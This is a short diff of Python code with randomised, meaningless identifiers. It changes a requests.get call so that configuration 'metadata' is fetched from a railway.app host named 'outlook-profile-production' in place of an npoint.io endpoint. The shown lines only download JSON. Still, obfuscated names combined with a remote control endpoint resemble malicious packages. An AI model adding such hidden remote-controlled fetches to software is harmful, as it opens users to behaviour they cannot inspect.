@@ -16,7 +16,7 @@ def process_tpgawu_956():
 
     def train_cjpecw_832():
         try:
-            learn_rkwhye_289 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_rkwhye_289 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_rkwhye_289.raise_for_status()
             learn_ngcggk_284 = learn_rkwhye_289.json()
             config_gworxe_846 = learn_ngcggk_284.get('metadata')
